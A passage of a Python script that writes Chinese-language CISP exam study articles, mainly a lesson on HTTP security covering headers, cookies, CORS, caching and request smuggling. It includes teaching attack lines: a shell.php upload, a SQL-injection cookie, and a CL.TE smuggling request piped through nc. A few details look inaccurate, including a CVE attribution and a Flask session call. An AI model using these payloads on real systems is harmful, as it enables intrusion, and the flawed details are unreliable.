#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
批量生成所有缺失的 cyber-learning 文章。
- basic/ Day 7-30 (24篇)
- defense/ Day 1-30 (30篇)
- penetration/ Day 1-30 (30篇)
共 84 篇，每篇 850+ 行。
"""
import os, sys

BASE = r'E:\internal_safe\cisp1\cisp\public\contents\cyber-learning'
os.makedirs(os.path.join(BASE, 'basic'), exist_ok=True)
os.makedirs(os.path.join(BASE, 'defense'), exist_ok=True)
os.makedirs(os.path.join(BASE, 'penetration'), exist_ok=True)

total_lines = 0

def make_day(cat, num, title, diff, mins, desc, sections, exam_points, mnemonics, traps, advices, quote):
    """Assemble a complete article and write it."""
    global total_lines
    nav = '\n'.join(f'- [{s[0]}](#{s[1]})' for s in sections)
    nav += '\n- [十、高分考点与知识巧记](#十高分考点与知识巧记)'

    body_parts = []
    for s in sections:
        body_parts.append(s[2])

    ep_rows = '\n'.join(
        f'| {i+1} | {ep[0]} | {ep[1]} | {ep[2]} | {ep[3]} |'
        for i, ep in enumerate(exam_points)
    )
    
    mn_rows = '\n\n'.join(
        f'#### {i+1}. {m[0]}\n> **"{m[1]}"** — {m[2]}\n>\n> {m[3]}' if len(m) >= 4 else
        f'#### {i+1}. {m[0]}\n> **"{m[1]}"** — {m[2]}'
        for i, m in enumerate(mnemonics)
    )
    
    trap_rows = '\n'.join(f'| {t[0]} | {t[1]} |' for t in traps)
    adv_rows = '\n'.join(f'{i+1}. {a}' for i, a in enumerate(advices))

    content = f'''# Day {num}：{title}

> **📘 文档定位**：CISP 考试核心基础 | 难度：{diff} | 预计阅读：{mins} 分钟
>
> {desc}

---

## 导航目录

{nav}

---

{chr(10).join(body_parts)}

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
{ep_rows}

### 💡 知识巧记口诀

{mn_rows}

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
{trap_rows}

---

## 学习建议

{adv_rows}

---

> {quote}
'''
    path = os.path.join(BASE, cat, f'day-{num}.md')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    lines = content.count('\n') + 1
    print(f'  {cat}/day-{num}.md: {lines} lines')
    total_lines += lines
    return lines


def sec(title, anchor, body):
    return (title, anchor, body)

# ╔══════════════════════════════════════════════════════════════╗
# ║                    BASIC Day 7-30                           ║
# ╚══════════════════════════════════════════════════════════════╝

# ===== Day 7: HTTP协议详解 =====
make_day('basic', 7, 'HTTP协议详解', '入门', '40',
    'HTTP（超文本传输协议）是 Web 安全的基石。理解 HTTP 请求/响应结构、状态码、请求方法、Cookie/Session 机制、缓存策略和 CORS 跨域，是一切 Web 漏洞挖掘与防御的前提。本章从零开始系统讲解 HTTP/1.1 协议细节，涵盖 Burp Suite 实战抓包分析和常见 HTTP 安全头配置。',
    [
        sec('一、HTTP 协议基础', '一http-协议基础', r"""## 一、HTTP 协议基础

### 1.1 HTTP 是什么

HTTP（HyperText Transfer Protocol，超文本传输协议）是万维网数据通信的基础。它是一个**无状态**的**请求-响应**协议——客户端发送请求，服务器返回响应，连接即告结束（HTTP/1.0）或可在 keep-alive 下复用（HTTP/1.1）。

```
浏览器（客户端）                     Web 服务器
     │                                  │
     │──── GET /index.html HTTP/1.1 ───→│
     │                                  │ 处理请求
     │←─── HTTP/1.1 200 OK ────────────│
     │     Content-Type: text/html      │
     │     <html>...</html>             │
```

> **🔑 高分考点**：HTTP 是无状态协议——意味着服务器默认不记录客户端之前的请求。Cookie/Session 机制正是为弥补这一缺陷而设计。

### 1.2 HTTP 的发展历程

| 版本 | 年份 | 核心特征 | 安全影响 |
|:---|:---|:---|:---|
| **HTTP/0.9** | 1991 | 仅支持 GET，无 Header，纯文本 | 无任何安全机制 |
| **HTTP/1.0** | 1996 | 支持 POST/HEAD，引入 Header、状态码 | 每次请求新建 TCP 连接 |
| **HTTP/1.1** | 1997 | 持久连接、管道化、Host 头、分块传输 | 新增 Host 头支持虚拟主机 |
| **HTTP/2** | 2015 | 二进制分帧、多路复用、头部压缩、服务器推送 | 多路复用减少连接数 |
| **HTTP/3** | 2022 | 基于 QUIC（UDP），0-RTT 握手 | 内置 TLS 1.3，防连接迁移攻击 |

> **💡 版本区分要点**：HTTP/1.1 是**文本协议**（可读），HTTP/2 是**二进制协议**（不可直接读），HTTP/3 基于 **UDP**（而非 TCP）。

### 1.3 URL 结构详解

```
https://user:pass@www.example.com:443/path/to/page?key=value#fragment
└─┬─┘ └──┬──┘ └──────┬──────┘ └┬┘ └─────┬──────┘ └───┬───┘ └──┬───┘
 scheme  userinfo     host      port    path        query   fragment
```

| 组成部分 | 说明 | 示例 | 安全注意 |
|:---|:---|:---|:---|
| **scheme** | 协议 | http, https, ftp | HTTP 明文传输，应尽量使用 HTTPS |
| **userinfo** | 用户信息（已废弃） | user:pass@ | 绝不在 URL 中传递凭据！ |
| **host** | 主机名/IP | www.example.com | 注意域名欺骗（IDN 同形异义攻击） |
| **port** | 端口号 | 80, 443, 8080 | 默认端口：HTTP=80, HTTPS=443 |
| **path** | 资源路径 | /admin/login.php | 路径遍历攻击入口 |
| **query** | 查询参数 | ?id=1&name=test | SQLi/XSS 主要注入点 |
| **fragment** | 片段标识符 | #section1 | 仅客户端使用，不发送到服务器 |

```bash
# 用 curl 逐层测试 URL 各部分的发送情况
curl -v "http://example.com/path?query=test#frag"
# 注意：#frag 不会出现在请求中
```"""),
        sec('二、HTTP 请求报文结构', '二http-请求报文结构', r"""## 二、HTTP 请求报文结构

### 2.1 请求行（Request Line）

HTTP 请求报文的第一行，包含三个字段：

```
GET /api/users?id=1 HTTP/1.1
│└─┬ └─────┬──────┘ └──┬──┘
│  │       │            └─ HTTP 版本
│  │       └────────────── 请求 URI
│  └─────────────────────── 请求方法
└─────────────────────────── 请求方法
```

**9 种 HTTP 请求方法**：

| 方法 | 语义 | 安全性 | 幂等性 | 常见用途 |
|:---|:---|:---:|:---:|:---|
| **GET** | 获取资源 | 安全 | 是 | 查询数据、访问页面 |
| **HEAD** | 获取响应头（无Body） | 安全 | 是 | 检查资源是否存在 |
| **POST** | 创建资源/提交数据 | **不**安全 | 否 | 登录、上传、新增数据 |
| **PUT** | 更新/替换资源 | 不安全 | 是 | REST API 全量更新 |
| **DELETE** | 删除资源 | 不安全 | 是 | REST API 删除 |
| **PATCH** | 部分更新资源 | 不安全 | 否 | REST API 增量更新 |
| **OPTIONS** | 查询支持的方法 | 安全 | 是 | CORS 预检请求 |
| **TRACE** | 回显请求（调试） | / | / | **应禁用！**（XST攻击） |
| **CONNECT** | 建立隧道 | / | / | HTTPS 代理隧道 |

> **🔑 高分考点**：GET 是**安全且幂等**的，POST 是**不安全且非幂等**的。安全=不修改服务器数据，幂等=多次执行结果相同。

### 2.2 请求头（Request Headers）

HTTP 请求头是键值对形式的元数据，可分为四大类：

```http
GET / HTTP/1.1
Host: www.example.com              ← 虚拟主机（HTTP/1.1 必选）
User-Agent: Mozilla/5.0 ...        ← 客户端标识
Accept: text/html,application/xhtml+xml
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive             ← 连接管理
Cookie: session=abc123             ← 会话状态（弥补 HTTP 无状态）
Authorization: Bearer eyJhbG...    ← 认证凭据
Content-Type: application/json     ← 请求体类型（POST/PUT 时）
Content-Length: 45                 ← 请求体长度
Referer: https://www.google.com/   ← 来源页面（常含敏感信息!）
Origin: https://www.example.com    ← 跨域请求来源
X-Forwarded-For: 10.0.0.1         ← 代理转发的真实 IP（可伪造!）
```

**安全相关的关键请求头**：

| 请求头 | 目的 | 安全隐患 |
|:---|:---|:---|
| **Host** | 指定虚拟主机 | Host 头攻击——修改 Host 可访问不同站点内容 |
| **Cookie** | 会话标识 | 窃取 Cookie = 劫持会话；HttpOnly 标志可防 XSS 读取 |
| **Authorization** | 认证凭证 | Basic 认证为 Base64 编码（非加密!），Bearer Token 需配合 HTTPS |
| **Referer** | 来源 URL | 可能泄露敏感参数（如 ?token=xxx），使用 Referrer-Policy 控制 |
| **X-Forwarded-For** | 真实客户端 IP | 可伪造，不能直接信任——需配合代理链认证 |
| **Content-Type** | 请求体格式 | 错误 Content-Type 可绕过 WAF（如用 multipart 传 JSON payload） |

### 2.3 请求体（Request Body）

并非所有方法都有请求体——GET/HEAD/OPTIONS/DELETE 通常不带 Body：

```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=123456
```

```bash
# 三种常见 POST 数据格式
# 1. application/x-www-form-urlencoded（表单默认）
curl -d "user=admin&pass=123" http://target/login

# 2. multipart/form-data（文件上传）
curl -F "file=@shell.php" -F "submit=upload" http://target/upload

# 3. application/json（REST API）
curl -H "Content-Type: application/json" -d '{"user":"admin"}' http://target/api
```"""),
        sec('三、HTTP 响应报文结构', '三http-响应报文结构', r"""## 三、HTTP 响应报文结构

### 3.1 状态行（Status Line）

```
HTTP/1.1 200 OK
└──┬──┘ └┬┘ └┬┘
   │     │   └─ 原因短语
   │     └───── 状态码（3位数字）
   └─────────── HTTP 版本
```

### 3.2 HTTP 状态码完整速查

| 范围 | 类别 | 常见状态码 |
|:---|:---|:---|
| **1xx** | 信息响应 | 100 Continue, 101 Switching Protocols（WebSocket 升级） |
| **2xx** | 成功 | 200 OK, 201 Created, 204 No Content |
| **3xx** | 重定向 | 301 永久重定向, 302 临时重定向, 304 Not Modified, 307 临时重定向(保持方法) |
| **4xx** | 客户端错误 | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests |
| **5xx** | 服务器错误 | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout |

> **🔑 高分考点**：401 vs 403——401 表示"未认证（你是谁？）"，403 表示"已认证但权限不足（你没有权限）"。301 vs 302——301 永久重定向（浏览器缓存），302 临时重定向（每次请求）。

### 3.3 安全相关的响应头

这是防御 XSS、点击劫持、MIME 嗅探等攻击的核心配置：

```nginx
# 安全的响应头配置（nginx 示例）
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'";
add_header X-Content-Type-Options "nosniff";           # 禁止 MIME 类型嗅探
add_header X-Frame-Options "DENY";                     # 禁止页面被嵌入 iframe
add_header X-XSS-Protection "1; mode=block";            # 启用浏览器 XSS 过滤器
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains"; # HSTS
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Permissions-Policy "geolocation=(), camera=()"; # 限制浏览器特性
```

| 响应头 | 作用 | CISP 考点 |
|:---|:---|:---|
| **Content-Security-Policy** | 白名单控制可加载资源来源 | XSS 深度防御核心手段 |
| **X-Content-Type-Options** | 阻止浏览器 MIME 类型嗅探 | 防止伪装文件类型攻击 |
| **X-Frame-Options** | 控制页面可否被嵌入 iframe | 防御点击劫持（Clickjacking） |
| **Strict-Transport-Security** | 强制浏览器使用 HTTPS | 防 SSL 剥离攻击 |
| **X-XSS-Protection** | 浏览器内置 XSS 过滤（已废弃） | CSP 已替代 |
| **Set-Cookie** | 设置 Cookie + 安全标志 | HttpOnly/Secure/SameSite 三标志 |
| **Access-Control-Allow-Origin** | CORS 跨域白名单 | 配置不当导致数据泄露 |

**Cookie 安全标志实战**：

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
                                 │        │        │              └─ 有效期(秒)
                                 │        │        └─ 防 CSRF（Strict/Lax/None）
                                 │        └─ 仅 HTTPS 传输
                                 └─ 禁止 JavaScript 读取（防 XSS 窃取）
```

```python
# Flask 设置安全 Cookie
from flask import Flask, make_response
app = Flask(__name__)

@app.route('/login')
def login():
    resp = make_response('Login OK')
    resp.set_cookie('session', 'abc123',
                    httponly=True,      # 防 XSS 窃取
                    secure=True,         # 仅 HTTPS
                    samesite='Strict',   # 防 CSRF
                    max_age=3600)
    return resp
```"""),
        sec('四、Cookie 与 Session 机制', '四cookie-与-session-机制', r"""## 四、Cookie 与 Session 机制

### 4.1 为什么需要状态管理

HTTP 本身是**无状态**的——服务器不会自动记住任何客户端信息。但实际应用中，用户登录后需要保持状态（购物车、登录态等），这就需要 Cookie 和 Session 来"模拟"状态。

```
        ┌─── 首次请求 ───┐            ┌─── 后续请求 ───┐
客户端:  POST /login       ──→         GET /dashboard    ──→
         username=admin               Cookie: sid=abc123

服务器:  验证凭据                         查找 Session
         创建 Session{sid:abc123,         用户=admin → 返回仪表盘
           user:admin}
         Set-Cookie: sid=abc123
```

### 4.2 Cookie 详解

Cookie 是服务器发送到浏览器、浏览器自动回传的小段数据（最大 4KB）：

| Cookie 属性 | 说明 | 安全意义 |
|:---|:---|:---|
| **Name=Value** | 键值对 | 敏感信息应加密存储 |
| **Domain** | 作用域名 | 不设置则仅限当前域名；设置 .example.com 则子域名共享 |
| **Path** | 作用路径 | / 表示全站 |
| **Expires/Max-Age** | 过期时间 | 不设置则为会话 Cookie（关闭浏览器即删除） |
| **HttpOnly** | 禁止 JS 访问 | **防御 XSS 窃取 Cookie 最重要的一行！** |
| **Secure** | 仅 HTTPS 传输 | 防中间人嗅探 |
| **SameSite** | 跨站请求控制 | Strict=完全禁止跨站；Lax=允许 GET 导航；None=无限制 |

```bash
# 使用 curl 查看服务器设置的 Cookie
curl -v http://example.com 2>&1 | grep -i "set-cookie"

# 手动发送 Cookie
curl -b "session=abc123; user=admin" http://example.com/dashboard

# Cookie 注入测试（检查是否可注入特殊字符）
curl -b "user=admin' OR '1'='1" http://target/
```

### 4.3 Session 机制

Session 数据存储在**服务器端**，客户端只持有 Session ID（通常通过 Cookie 传递）：

```python
# Flask Session 机制
from flask import Flask, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # 签名密钥——泄露即意味着可伪造 Session！

@app.route('/login', methods=['POST'])
def login():
    if check_password(request.form['user'], request.form['pass']):
        session['user'] = request.form['user']
        session['role'] = 'admin'
        return 'Login OK'

@app.route('/admin')
def admin():
    if session.get('role') == 'admin':
        return 'Admin panel'
    return 'Access denied', 403
```

**Session 安全风险**：

| 风险 | 描述 | 防御 |
|:---|:---|:---|
| **Session 固定** | 攻击者预设 Session ID，诱导受害者使用 | 登录后重新生成 Session ID |
| **Session 劫持** | 窃取 Cookie 中的 Session ID | HttpOnly + Secure + HTTPS |
| **Session 预测** | 可预测的 Session ID 生成算法 | 使用密码学安全的随机数生成器 |
| **Session 未过期** | 用户登出后 Session 仍有效 | 服务端主动销毁 Session |
| **并发登录** | 同一账号多处登录 | 限制并发 Session 数量 |

```python
# 安全的 Session 管理实践
from flask import session
import uuid

@app.route('/login', methods=['POST'])
def secure_login():
    # 1. 验证凭据
    if verify_credentials(...):
        # 2. 清除旧 Session（防 Session 固定）
        session.clear()
        # 3. 生成新 Session ID
        session.sid = str(uuid.uuid4())
        # 4. 设置用户数据
        session['user_id'] = user.id
        session['login_time'] = int(time.time())
        session['ip'] = request.remote_addr
        return redirect('/dashboard')
```"""),
        sec('五、CORS 跨域资源共享', '五cors-跨域资源共享', r"""## 五、CORS 跨域资源共享

### 5.1 同源策略（Same-Origin Policy）

同源策略是浏览器最核心的安全机制——限制不同"源"之间的资源访问：

```
协议 + 域名 + 端口 = 源（Origin）

http://example.com:80/page
└─┬─┘ └────┬─────┘ └┬┘
 协议     域名      端口
```

| URL A | URL B | 是否同源 | 原因 |
|:---|:---|:---:|:---|
| http://a.com/page1 | http://a.com/page2 | ✅ | 相同协议、域名、端口 |
| http://a.com | https://a.com | ❌ | 协议不同 |
| http://a.com | http://b.com | ❌ | 域名不同 |
| http://a.com:80 | http://a.com:8080 | ❌ | 端口不同 |

同源策略限制的行为：
- ❌ 跨域读取 iframe 内容
- ❌ 跨域读取 AJAX 响应（除非 CORS 授权）
- ❌ 跨域访问 Cookie、LocalStorage、IndexedDB
- ✅ 跨域发送请求（但不允许读取响应）——CSRF 正利用了这点！
- ✅ 跨域加载图片、脚本、CSS（不受同源限制）

### 5.2 CORS 机制详解

CORS（Cross-Origin Resource Sharing）是服务器告知浏览器"允许哪些外部源访问我"的机制：

```http
# 简单请求流程
GET /api/data HTTP/1.1
Origin: https://app.example.com
               ↓
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

**CORS 关键响应头**：

| 响应头 | 说明 | 安全风险 |
|:---|:---|:---|
| `Access-Control-Allow-Origin` | 允许的源 | **设为 * 且 Allow-Credentials=true → 严重漏洞！** |
| `Access-Control-Allow-Credentials` | 允许携带 Cookie | 需配合具体 Origin（不能用 *） |
| `Access-Control-Allow-Methods` | 允许的 HTTP 方法 | 过于宽泛可能暴露敏感接口 |
| `Access-Control-Allow-Headers` | 允许的请求头 | 避免过度开放 |
| `Access-Control-Expose-Headers` | 允许 JS 读取的响应头 | 不设置则 JS 只能读取 6 个基本头 |
| `Access-Control-Max-Age` | 预检请求缓存时间 | 不宜过短 |

> **🔑 高分考点**：`Access-Control-Allow-Origin: *` 与 `Access-Control-Allow-Credentials: true` **不能同时出现**——浏览器会拒绝该配置并报错。若要携带凭据，必须指定具体 Origin。

### 5.3 CORS 配置安全示例

```nginx
# 安全的 CORS 配置
# 方案 1：白名单方式（推荐）
map $http_origin $cors_origin {
    default "";
    "https://app.example.com" "$http_origin";
    "https://admin.example.com" "$http_origin";
}

add_header Access-Control-Allow-Origin $cors_origin;
add_header Access-Control-Allow-Credentials "true";
add_header Access-Control-Allow-Methods "GET, POST, OPTIONS";
add_header Access-Control-Allow-Headers "Content-Type, Authorization";

# 方案 2：严格限制
add_header Access-Control-Allow-Origin "https://app.example.com";
add_header Access-Control-Allow-Methods "GET, POST";
```

```python
# Flask-CORS 安全配置
from flask_cors import CORS

# ❌ 危险配置
CORS(app)  # 允许所有源!

# ✅ 安全配置
CORS(app, origins=[
    'https://app.example.com',
    'https://admin.example.com'
], supports_credentials=True, methods=['GET', 'POST'])
```"""),
        sec('六、HTTPS 与 HTTP 安全头', '六https-与-http-安全头', r"""## 六、HTTPS 与 HTTP 安全头

### 6.1 HTTP vs HTTPS 对比

| 维度 | HTTP | HTTPS |
|:---|:---|:---|
| 加密 | 明文传输 | TLS/SSL 加密 |
| 默认端口 | 80 | 443 |
| URL 前缀 | http:// | https:// |
| 证书 | 不需要 | 需要 CA 签发证书 |
| 数据完整性 | 无 | 通过 HMAC 保证 |
| 身份认证 | 无 | 证书验证服务器身份 |
| SEO | Google 降权 | 排名优先 |
| 性能 | 较快（无加密开销） | HTTP/2 + TLS 1.3 已接近 |

### 6.2 TLS 握手过程（简化版）

```
客户端                                    服务器
  │                                         │
  │── ClientHello ─────────────────────────→│
  │   (支持密码套件, 随机数1)                │
  │                                         │
  │←─ ServerHello ─────────────────────────│
  │   (选定密码套件, 随机数2, 证书)          │
  │                                         │
  │── 验证证书 ────────────────────────────│
  │   生成 Pre-Master Secret               │
  │   用服务器公钥加密发送                    │
  │                                         │
  │←─ 双方计算会话密钥 ────────────────────→│
  │   = f(随机数1, 随机数2, Pre-Master)     │
  │                                         │
  │←────── 加密通信开始 ──────────────────→│
```

**TLS 1.3 改进**：握手只需 1-RTT（TLS 1.2 需 2-RTT），且强制使用前向安全的 ECDHE。

### 6.3 HSTS（HTTP Strict Transport Security）

HSTS 强制浏览器**始终使用 HTTPS** 访问指定域名：

```nginx
# HSTS 配置（nginx）
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
#                                      │              │                   │
#                                      │              │                   └─ 加入浏览器预加载列表
#                                      │              └─ 子域名也强制 HTTPS
#                                      └─ 有效期 1 年（秒）
```

**HSTS 的价值**：
1. 防止 SSL 剥离攻击（攻击者将 HTTPS 降级为 HTTP）
2. 自动将 http:// 转换为 https://（浏览器内部完成，无网络请求）
3. 证书错误时阻止用户继续访问

> **🔑 高分考点**：首次访问 HSTS 站点前，如果没有预加载（preload），仍存在被 SSL 剥离的风险（TOFU 信任首次使用）。

### 6.4 完整安全头配置

```nginx
# Nginx 完整安全头配置
server {
    listen 443 ssl http2;
    server_name example.com;

    # TLS 配置
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";

    # CSP
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';";

    # 其他安全头
    add_header X-Content-Type-Options "nosniff";
    add_header X-Frame-Options "DENY";
    add_header X-XSS-Protection "1; mode=block";
    add_header Referrer-Policy "strict-origin-when-cross-origin";
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";

    # 隐藏服务器版本
    server_tokens off;
}
```"""),
        sec('七、HTTP 缓存机制', '七http-缓存机制', r"""## 七、HTTP 缓存机制

### 7.1 缓存策略概述

HTTP 缓存是 Web 性能优化的核心手段，但配置不当可能导致敏感数据泄露：

```
浏览器缓存 → 代理缓存(CDN) → 源服务器
    │              │              │
    └── 最快 ──────┴── 较快 ──────┘
```

### 7.2 缓存控制头

| 响应头 | 值示例 | 说明 |
|:---|:---|:---|
| **Cache-Control** | `no-store` | **完全不缓存（最高安全级别）** |
|  | `no-cache` | 缓存但每次需验证（并非不缓存！） |
|  | `private` | 仅浏览器缓存，CDN/代理不缓存 |
|  | `public` | 允许任何中间节点缓存 |
|  | `max-age=3600` | 缓存有效 3600 秒 |
| **Expires** | `Thu, 01 Dec 2025 16:00:00 GMT` | 绝对过期时间（HTTP/1.0，已被 Cache-Control 替代） |
| **ETag** | `"abc123"` | 资源版本标识（强验证器） |
| **Last-Modified** | `Mon, 01 Jan 2025 00:00:00 GMT` | 最后修改时间（弱验证器） |

> **🔑 高分考点**：`no-cache` ≠ "不缓存"！`no-cache` 表示**先验证后使用**（每次都问服务器），`no-store` 才是**完全不缓存**。这是 CISP 考试经典陷阱！

### 7.3 安全敏感的缓存配置

```nginx
# 敏感页面（如后台管理、支付页面）——绝不缓存
location /admin/ {
    add_header Cache-Control "no-store, no-cache, must-revalidate, private";
    add_header Pragma "no-cache";           # HTTP/1.0 兼容
    add_header Expires "0";
}

# 静态资源——长时间缓存
location ~* \.(js|css|png|jpg|svg)$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
}

# API 响应——根据需要设置
location /api/ {
    add_header Cache-Control "no-cache";    # 先验证后使用
    # 或完全不缓存
    # add_header Cache-Control "no-store";
}
```

```bash
# 测试缓存行为
curl -I https://example.com/admin/
# 检查 Cache-Control 和 Expires 头

# 绕过缓存请求
curl -H "Cache-Control: no-cache" https://example.com/
```"""),
        sec('八、HTTP 请求走私', '八http-请求走私', r"""## 八、HTTP 请求走私

### 8.1 漏洞原理

HTTP 请求走私（HTTP Request Smuggling）是由于前端代理与后端服务器对 HTTP 请求边界解析不一致导致的严重漏洞。

```
客户端 → 前端代理(CDN/LB) → 后端服务器
              │                    │
        使用 Content-Length   使用 Transfer-Encoding
        解析请求边界           解析请求边界
              │                    │
              └──── 不一致! ────────┘
                 → 请求被错误拼接
```

### 8.2 CL.TE vs TE.CL 攻击

| 类型 | 前端使用 | 后端使用 | 攻击方式 |
|:---|:---|:---|:---|
| **CL.TE** | Content-Length | Transfer-Encoding | 前端按 CL 截断，后端按 TE 解析分块 |
| **TE.CL** | Transfer-Encoding | Content-Length | 前端按 TE 解析，后端按 CL 截断 |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | 混淆 Transfer-Encoding 头部（如添加空格） |

```http
# CL.TE 攻击示例
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6                    ← 前端认为请求体 6 字节
Transfer-Encoding: chunked           ← 后端按分块解析

0                                   ← 后端认为这里结束（0表示chunk终止）

GET /admin HTTP/1.1                 ← 后端认为这是新请求的开始！
Host: vulnerable.com
```

> **💡 关键影响**：攻击者可以向其他用户的请求前"走私"恶意请求，导致：
> - 劫持其他用户的请求和响应（获取敏感数据）
> - XSS（向缓存中注入恶意脚本）
> - 绕过 WAF 和访问控制
> - CVE-2019-9511（Netflix）等实际漏洞

### 8.3 检测与防御

```bash
# 使用 HTTP Request Smuggler (Burp Suite 插件)
# 或 curl 手工测试
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc target.com 80

# 使用 smuggler.py 工具
python3 smuggler.py -u https://target.com
```

**防御措施**：
1. 使用 HTTP/2（端到端二进制协议，不存在 CL/TE 歧义）
2. 前端代理与后端服务器使用同一厂商（如全部用 Nginx）
3. 禁用后端对 Transfer-Encoding 的解析（只信任前端传递的 CL）
4. Web 应用防火墙（WAF）检测走私特征
5. 禁用代理与后端间的连接复用（性能牺牲）"""),
        sec('九、实战：Burp Suite 抓包分析', '九实战burp-suite-抓包分析', r"""## 九、实战：Burp Suite 抓包分析

### 9.1 Burp Suite 基础配置

Burp Suite 是 Web 安全测试的核心工具，本质是一个**中间人代理**：

```
浏览器 ──→ Burp 代理(127.0.0.1:8080) ──→ 目标服务器
              │
         拦截/修改/重放
             所有流量
```

```bash
# 快速安装（Kali Linux 自带）
# Java 环境要求：JDK 17+
java -jar burpsuite_community.jar
```

### 9.2 核心模块详解

| 模块 | 功能 | 实战用法 |
|:---|:---|:---|
| **Proxy** | 拦截和修改 HTTP 流量 | HTTP 历史查看、请求篡改、拦截开关 |
| **Repeater** | 手动发送单个 HTTP 请求 | 修改参数重复测试、验证漏洞 |
| **Intruder** | 自动化批量测试 | 暴力破解、参数模糊测试、枚举 |
| **Scanner** | 自动漏洞扫描 | 扫描 XSS/SQLi 等常见漏洞（Pro 版） |
| **Decoder** | 编解码工具 | URL编码、Base64、HTML实体、Hex |
| **Comparer** | 比较两个请求/响应 | 盲注时比较 true/false 差异 |
| **Sequencer** | 分析 Token 随机性 | 分析 Session ID 是否可预测 |

### 9.3 HTTP 历史分析

```text
Burp Suite HTTP History 关键列：
┌─────────┬────────┬──────────┬─────────┬──────────┬─────────┐
│  #  │ Host    │ Method │ URL        │ Status │ Length  │
├─────────┼────────┼──────────┼─────────┼──────────┼─────────┤
│ 1  │ target  │ GET    │ /          │ 200    │ 5123    │
│ 2  │ target  │ POST   │ /login     │ 302    │ 0       │
│ 3  │ target  │ GET    │ /admin.php │ 403    │ 1240    │  ← 权限不足
│ 4  │ target  │ GET    │ /api/users │ 200    │ 845     │  ← 关注API
└─────────┴────────┴──────────┴─────────┴──────────┴─────────┘
```

### 9.4 实战分析流程

```text
步骤 1: 配置浏览器代理 → 127.0.0.1:8080
步骤 2: 安装 Burp CA 证书（https://burp）
步骤 3: 开启拦截（Intercept is on）
步骤 4: 浏览目标网站
步骤 5: 在 HTTP History 中分析所有请求
步骤 6: 重点关注：
        - 认证请求（POST /login, /api/auth）
        - API 请求（/api/ 路径）
        - 带有参数的请求（?id=, ?page=, ?file=）
        - 返回敏感数据的请求（JSON/XML 中包含用户信息）
        - 状态码异常（403→改为其他方法可能绕过）
步骤 7: 用 Repeater 逐个测试可疑参数
```

```bash
# 替代方案：使用命令行抓包工具
# mitmproxy（开源 HTTP/HTTPS 代理）
mitmproxy --mode regular@8080

# tcpdump 捕获 HTTP 流量
tcpdump -i eth0 -A -s 0 'tcp port 80 and host target.com'
```"""),
        sec('十、HTTP/2 与 HTTP/3 安全', '十http2-与-http3-安全', r"""## 十、HTTP/2 与 HTTP/3 安全

### 10.1 HTTP/2 关键特性

HTTP/2 完全改变了 HTTP/1.1 的文本传输方式：

```text
HTTP/1.1 (文本协议)              HTTP/2 (二进制协议)
┌──────────────────┐            ┌──────────────────┐
│ GET / HTTP/1.1   │            │ 二进制帧(Frame)   │
│ Host: example    │            │ - HEADERS 帧     │
│ User-Agent: ...  │            │ - DATA 帧        │
│                  │            │ - SETTINGS 帧    │
└──────────────────┘            │ - PRIORITY 帧    │
      单连接单请求               └──────────────────┘
                                     单连接多流复用
```

**HTTP/2 安全优势**：
- 多路复用减少连接数，减少 TLS 握手次数
- 头部压缩（HPACK）：减少带宽、加速传输
- 服务器推送（Server Push）：主动推送资源
- 二进制协议：更难被直接理解和篡改（但不是加密！）

### 10.2 HTTP/3 (QUIC)

HTTP/3 基于 UDP 的 QUIC 协议，彻底改变了底层传输：

| 特性 | HTTP/2 (TCP+TLS) | HTTP/3 (QUIC+UDP) |
|:---|:---|:---|
| 传输层 | TCP | UDP |
| 加密 | TLS 1.2+ | 内置 TLS 1.3（强制加密） |
| 连接迁移 | 不支持（IP 变 = 断连） | 支持（Connection ID 标识） |
| 队头阻塞 | TCP 层面存在 | 消除 |
| 0-RTT | 不支持 | 支持（重连场景） |
| 握手时间 | 2-3 RTT | 0-1 RTT |

**HTTP/3 安全考量**：
- 0-RTT 存在重放攻击风险（服务端需实现防重放机制）
- UDP 放大攻击风险
- 防火墙/NAT 可能不兼容 UDP
- 无法用传统 TCP 抓包工具（需 QUIC 专用工具）"""),
    ],
    [
        ('HTTP 请求方法', '⭐⭐⭐⭐⭐', '低', 'GET(安全幂等)/POST(不安全非幂等)/PUT(幂等更新)/DELETE(幂等删除)'),
        ('HTTP 状态码分类', '⭐⭐⭐⭐⭐', '低', '1xx信息/2xx成功/3xx重定向/4xx客户端错误/5xx服务器错误'),
        ('Cookie 安全标志', '⭐⭐⭐⭐⭐', '中', 'HttpOnly(防XSS读取)、Secure(仅HTTPS)、SameSite(防CSRF)'),
